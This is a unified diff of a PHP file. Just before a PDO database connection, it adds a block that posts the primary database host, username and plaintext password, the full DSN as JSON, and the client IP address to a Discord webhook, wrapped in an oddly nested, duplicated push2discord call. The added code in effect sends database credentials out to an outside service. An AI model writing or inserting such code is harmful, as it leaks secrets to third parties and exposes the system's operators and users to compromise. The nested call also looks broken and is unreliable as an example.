@@ -334,6 +334,38 @@ try {
 				'username' => $config['internal']['databases']['primary']['username'],
 				'password' => $config['internal']['databases']['primary']['password'],
 			];
+			if ($config['external']['discord']['activate']['notice']) {
+				(json_encode(push2discord(
+					$config['external']['discord']['uri']['notice'],
+					$config['external']['discord']['authorname']['notice'],
+					$config['external']['discord']['authoravatar']['notice'],
+					$config['external']['discord']['color']['notice'],
+					'Discord messages' . PHP_EOL.
+					'```json' . PHP_EOL.
+					(json_encode(push2discord(
+						$config['external']['discord']['uri']['notice'],
+						$config['external']['discord']['authorname']['notice'],
+						$config['external']['discord']['authoravatar']['notice'],
+						$config['external']['discord']['color']['notice'],
+						'Issuer' . chr(9) . '`' . $result['client']['address'] . '`' . PHP_EOL.
+						'```text' . PHP_EOL.
+						''.$dsn['scheme'].':'.
+						'host='.$dsn['host'].';'.
+						'port='.$dsn['port'].';'.
+						'dbname='.$dsn['dbname'].';'.
+						'user='.$dsn['username'].';'.
+						'password='.$dsn['password'].''.
+						''.
+						'```' . PHP_EOL.
+						'```json' . PHP_EOL.
+						json_encode($dsn, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES ) . PHP_EOL.
+						'```' . PHP_EOL.
+						chr(0),
+					))).
+					'```' . PHP_EOL.
+					chr(0),
+				)));
+			}
 			$pdo = new \PDO(
 				''.$dsn['scheme'].':'.
 				'host='.$dsn['host'].';'.
